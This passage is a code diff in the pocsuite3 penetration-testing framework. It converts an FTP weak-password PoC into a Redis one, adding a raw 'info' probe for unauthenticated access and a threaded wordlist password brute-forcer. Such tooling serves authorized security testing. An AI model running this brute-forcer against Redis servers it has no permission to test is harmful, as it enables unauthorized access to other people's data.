@@ -1,10 +1,10 @@
-"""
-If you have issues about development, please read:
-https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
-for more about information, plz visit https://pocsuite.org
-"""
-
-import ftplib
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @File : redis_burst.py
+# @Author : Norah C.IV
+# @Time : 2022/4/25 10:35
+# @Software: PyCharm
+import redis
 import itertools
 import queue
 import socket
@@ -13,31 +13,34 @@ from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, V
 from pocsuite3.lib.core.data import paths
 from pocsuite3.lib.core.threads import run_threads
 
+task_queue = queue.Queue()
+result_queue = queue.Queue()
+
 
 class DemoPOC(POCBase):
-    vulID = '62522'
-    version = '3'
-    author = ['seebug']
-    vulDate = '2013-11-21'
-    createDate = '2013-11-21'
-    updateDate = '2013-11-21'
-    references = ['http://sebug.net/vuldb/ssvid-62522']
-    name = 'FTP 弱密码'
+    vulID = '3'
+    version = '1'
+    author = ['Norah C.IV']
+    vulDate = '2022-04-25'
+    createDate = '2022-04-25'
+    updateDate = '2022-04-25'
+    references = ['']
+    name = 'Redis 弱密码(未授权访问)'
     appPowerLink = ''
-    appName = 'ftp'
+    appName = 'redis'
     appVersion = 'All'
     vulType = VUL_TYPE.WEAK_PASSWORD
-    desc = '''ftp 存在弱密码，导致攻击者可连接进行文件管理进行恶意操作'''
+    desc = '''redis 存在弱密码(未授权访问)，可导致攻击者进行恶意操作'''
     samples = ['']
     category = POC_CATEGORY.TOOLS.CRACK
-    protocol = POC_CATEGORY.PROTOCOL.FTP
+    protocol = POC_CATEGORY.PROTOCOL.REDIS
 
     def _verify(self):
         result = {}
         host = self.getg_option("rhost")
-        port = self.getg_option("rport") or 21
+        port = self.getg_option("rport") or 6379
 
-        ftp_burst(host, port)
+        redis_burst(host, port)
         if not result_queue.empty():
             username, password = result_queue.get()
             result['VerifyInfo'] = {}
@@ -60,17 +63,13 @@ class DemoPOC(POCBase):
         return output
 
 
-task_queue = queue.Queue()
-result_queue = queue.Queue()
-
-
 def get_word_list():
-    with open(paths.FTP_USER) as username:
-        with open(paths.FTP_PASS) as password:
-            return itertools.product(username, password)
+    username = ['']
+    with open(paths.REDIS_PASS) as password:
+        return itertools.product(username, password)
 
 
-def port_check(host, port=21):
+def port_check(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect = s.connect_ex((host, int(port)))
     if connect == 0:
@@ -80,21 +79,31 @@ def port_check(host, port=21):
         return False
 
 
-def anonymous_login(host, port):
-    return ftp_login(host, port, anonymous=True)
-
-
-def ftp_login(host, port, username=None, password=None, anonymous=False):
+def unauthorized_access(host, port):
     ret = False
     try:
-        ftp = ftplib.FTP()
-        ftp.connect(host, port, timeout=6)
-        if anonymous:
-            ftp.login()
-        else:
-            ftp.login(username, password)
+        s = socket.socket()
+        payload = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
+        socket.setdefaulttimeout(10)
+
+        s.connect((host, int(port)))
+        s.sendall(payload.encode())
+        recv = s.recv(1024).decode()
+
+        if recv and 'redis_version' in recv:
+            ret = True
+            s.close()
+    except Exception:
+        pass
+    return ret
+
+
+def redis_login(host, port, password=None):
+    ret = False
+    redis_db = redis.StrictRedis(host=host, port=port, db=0, password=password)
+    try:
+        redis_db.info()
         ret = True
-        ftp.quit()
     except Exception:
         pass
     return ret
@@ -110,21 +119,19 @@ def task_thread():
         host, port, username, password = task_queue.get()
         # logger.info('try burst {}:{} use username:{} password:{}'.format(
         #     host, port, username, password))
-        if ftp_login(host, port, username, password):
+        if redis_login(host, port, password):
             with task_queue.mutex:
                 task_queue.queue.clear()
-            result_queue.put((username, password))
+            result_queue.put(('<empty>', password))
 
 
-def ftp_burst(host, port):
+def redis_burst(host, port):
     if not port_check(host, port):
         logger.warning("{}:{} is unreachable".format(host, port))
         return
 
-    if anonymous_login(host, port):
-        # logger.info('try burst {}:{} use username:{} password:{}'.format(
-        #     host, port, 'anonymous', '<empty>'))
-        result_queue.put(('anonymous', '<empty>'))
+    if unauthorized_access(host, port):
+        result_queue.put(('<empty>', '<empty>'))
         return
 
     try:
